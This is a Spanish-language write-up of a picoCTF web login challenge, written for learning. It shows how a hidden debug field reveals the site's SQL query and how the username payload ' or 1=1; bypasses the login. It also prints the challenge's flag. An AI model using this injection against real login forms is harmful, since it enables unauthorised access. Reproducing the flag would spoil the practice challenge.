# Objetivo

Hay un sitio web funcionando en `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) o http: //jupiter.challenges.picoctf.org:50009. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!
1. No parece haber muchas formas de interactuar con esto. Me pregunto si los usuarios se mantienen en una base de datos.
2. Intente pensar en cómo el sitio web verifica su inicio de sesión.

## Solución

```
Causaremos un error de inyeccion, haciendo uso de unas comillas en laparte del usuario (").
Inspeccionamos el cuadro y vemos que el apartado donde ingresamos los datos de usuario y password, son identificados como username y password.
Tambien observamos que en el cuadro de Login, se pueden cambiar varios parametros, y ahi observamos que salen varios parametros que estaban ocultos con anterioridad:

<input type="hidden" name="debug" value="0">

--Este apartado lo cambiamos a 1 y nos aparecen los datos que se envian desde los cuadros de texto y ademas la consulta que se realiza en la abse de datos, la cual es:
SQL query: SELECT * FROM users WHERE name='usermane' AND password='password'
Entonces jugamos con esta consulta y con el usuario enviamos 
username: ' or 1=1;
password: password
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='password'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}


```
## Notas adicionales

- Usamos inyección SQL, tratando de burlar la consulta que hace la pagina a la base de datos.
- Esto lo pudimos realizar tanto en la pagina al momento de inspeccionar como en la terminal de nuestra maquina.

Usamos las siguientes instrucciones:
usermane: ' or 1=1;
password: password
SQL query: SELECT * FROM users WHERE name='' or 1=1; AND password='admin'
## Referencias

http://jsnice.org/